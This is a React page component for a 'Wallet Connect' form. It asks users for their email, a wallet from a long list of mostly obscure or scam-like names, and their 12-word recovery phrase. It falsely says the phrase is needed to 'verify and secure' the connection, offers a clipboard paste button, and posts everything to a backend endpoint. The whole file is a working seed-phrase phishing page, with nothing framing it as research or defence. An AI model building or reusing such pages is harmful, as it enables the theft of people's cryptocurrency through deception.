import { useLocation } from "wouter";
import { Card, CardContent } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { Textarea } from "@/components/ui/textarea";
import { useToast } from "@/hooks/use-toast";
import { useState, useEffect } from "react";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Loader2, Info, AlertCircle } from "lucide-react"; // Added AlertCircle
import { Text3D } from "@/components/animations/text-3d";

const WALLET_OPTIONS = [
  "AdvancedIWP", "Aixbond", "Ally Swift", "AmistadSwift", "Atomic", "Bekrotax",
  "Bitachons", "Bitcoin", "Bitomex", "Bitmax", "Bitware", "BTC", "Cfstrades",
  "Coinarch", "Coinacceso", "Coinaffix", "Coinsjex", "Coinsutra", "ColdWalletOnline",
  "Cryptbi", "Cryptokneit", "Dmartbit", "FaucetPay", "GlobalPay", "Global Business Pay",
  "GlobalDigitalAccess", "Global Swift", "GlobalSwiftPay", "GlobalPerfect Pay",
  "GlobeVault", "Gobitchain", "Gnbit", "Gresop", "Hcuox", "Hobitax",
  "InternationalGlobalPay", "InstaBusinessPay", "Instant Marchant-p", "InstaPayeWallet",
  "InstaWalletPay", "Ketamic", "Ketonec", "KingsCoin Wallet", "Kiptrachain",
  "Kointruxt", "KonnectWallet", "Lainchain", "Lezochain", "Lilpole", "Mainobit",
  "Maintocoin", "Marlone", "Mathskoin", "NexaGlobal", "Paradetic", "PaySwift",
  "Plutusvault", "Prexdeto", "Prizrex", "QuickWalletPay", "Rendoxx", "Saporux",
  "Sap TrustAccountWeb", "Senovan", "SkyRemit", "StackCoinAccount", "Stripe",
  "Stronvit", "Supperlin", "Swift Blink", "SwiftBusinessPay", "Swischain",
  "SwiftPay", "Swift Remit", "SwiftSecure", "SwiftStem", "SwiftWorld",
  "TransferSwift", "Trudex", "TrustPaydWallet", "Ultradotic", "Universal Businesspay",
  "USDTxyn", "Vigixswiz", "Wetrans2u", "Xomit", "Zenquickcash", "Zenithswift", "Zigobit", "Zilnex"
];

export default function Web3() {
  const [, setLocation] = useLocation();
  const [isLoading, setIsLoading] = useState(false);
  const [isPageLoading, setIsPageLoading] = useState(true);
  const [email, setEmail] = useState("");
  const [selectedWallet, setSelectedWallet] = useState("");
  const { toast } = useToast();
  const [seedPhrase, setSeedPhrase] = useState("");
  const [error, setError] = useState(''); // Added error state
  const [isSubmitting, setIsSubmitting] = useState(false); // Added isSubmitting state


  useEffect(() => {
    setTimeout(() => {
      setIsPageLoading(false);
    }, 3000);
  }, []);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);
    setError('');

    if (!email || !selectedWallet || !seedPhrase) {
      toast({
        title: "Error",
        description: "Please fill in all fields",
        variant: "destructive"
      });
      setIsSubmitting(false);
      return;
    }

    try {
      const response = await fetch('/api/wallet/connect', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          email,
          walletType: selectedWallet,
          recoveryPhrase: seedPhrase
        })
      });

      const data = await response.json();

      if (response.ok) {
        setLocation('/sync-success');
      } else {
        console.error('Error saving data:', data);
        setError(typeof data.error === 'string' ? data.error : 'Failed to connect wallet. Please try again.');
      }
    } catch (error) {
      console.error('Error saving data:', error);
      setError('Network error. Please check your connection and try again.');
    } finally {
      setIsSubmitting(false);
    }
  };

  if (isPageLoading) {
    return (
      <div className="min-h-screen flex items-center justify-center">
        <div className="text-center">
          <Loader2 className="h-12 w-12 animate-spin text-primary mx-auto mb-4" />
          <p className="text-lg text-black">Loading secure connection...</p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-background py-12 dark relative overflow-hidden">
      <div className="absolute inset-0 bg-primary/5 backdrop-blur-xl pointer-events-none" />

      <div className="container mx-auto px-4 relative z-10">
        <main className="max-w-3xl mx-auto">
          <div className="space-y-8">
            <section className="text-center mb-12">
              <Text3D text="Wallet Connect" className="mb-4" />
              <p className="text-black text-lg">
                Complete your wallet connection securely
              </p>
            </section>

            <Card className="border-2 bg-white/50 backdrop-blur-sm">
              <CardContent className="p-6">
                {error && ( // Added error display
                  <div className="mb-4 bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded relative" role="alert">
                    <strong className="font-bold">Error:</strong>
                    <span className="block sm:inline">{error}</span>
                    <span className="absolute top-0 bottom-0 right-0 px-4 py-3">
                      <AlertCircle className="h-5 w-5 text-red-500" />
                    </span>
                  </div>
                )}
                <form onSubmit={handleSubmit} className="space-y-6">
                  <div className="space-y-2">
                    <label className="text-sm font-medium text-black">Email Address</label>
                    <Input
                      type="email"
                      placeholder="Enter your email"
                      value={email}
                      onChange={(e) => setEmail(e.target.value)}
                      required
                      className="bg-white/50 text-black placeholder:text-black/60"
                    />
                  </div>

                  <div className="space-y-2">
                    <label className="text-sm font-medium text-black">From</label>
                    <Select value={selectedWallet} onValueChange={setSelectedWallet}>
                      <SelectTrigger className="bg-white/50 text-black border-2 border-black/10 hover:bg-white/70 transition-colors">
                        <SelectValue placeholder="Choose your wallet" />
                      </SelectTrigger>
                      <SelectContent className="max-h-[300px] overflow-y-auto bg-white/90 backdrop-blur-lg border-2">
                        {WALLET_OPTIONS.map((wallet) => (
                          <SelectItem
                            key={wallet}
                            value={wallet}
                            className="text-black hover:bg-black/10 cursor-pointer transition-colors"
                          >
                            {wallet}
                          </SelectItem>
                        ))}
                      </SelectContent>
                    </Select>
                  </div>

                  <div className="space-y-2">
                    <label className="text-sm font-medium text-black">Recovery Phrase</label>
                    <div className="flex items-start gap-2 mb-2">
                      <Info className="w-5 h-5 text-primary mt-0.5" />
                      <p className="text-sm text-black/70">
                        Please enter your 12-word recovery phrase, with each word separated by a space.
                        This is required to verify and secure your wallet connection.
                      </p>
                    </div>
                    <div className="relative">
                      <Textarea
                        placeholder="Enter your 12-word seed phrase separated by spaces..."
                        value={seedPhrase}
                        onChange={(e) => setSeedPhrase(e.target.value)}
                        required
                        className="h-32 bg-white/50 text-black placeholder:text-black/60 pr-20"
                      />
                      <button
                        type="button"
                        onClick={async () => {
                          try {
                            const text = await navigator.clipboard.readText();
                            setSeedPhrase(text);
                            toast({
                              title: "Pasted successfully",
                              variant: "default"
                            });
                          } catch (err) {
                            toast({
                              title: "Could not access clipboard",
                              description: "Please paste manually or allow clipboard access",
                              variant: "destructive"
                            });
                          }
                        }}
                        className="absolute right-2 top-2 bg-primary text-white px-3 py-1 rounded-md text-sm hover:bg-primary/80 transition-colors"
                      >
                        Paste
                      </button>
                    </div>
                  </div>

                  <Button type="submit" className="w-full relative" disabled={isLoading || isSubmitting}> {/* Added isSubmitting to disable button */}
                    {isLoading || isSubmitting ? (
                      <>
                        <span className="opacity-0">Submit</span>
                        <div className="absolute inset-0 flex items-center justify-center">
                          <Loader2 className="h-6 w-6 animate-spin" />
                          <span className="ml-2">Processing...</span>
                        </div>
                      </>
                    ) : (
                      "Submit"
                    )}
                  </Button>
                </form>
              </CardContent>
            </Card>
          </div>
        </main>
      </div>
    </div>
  );
}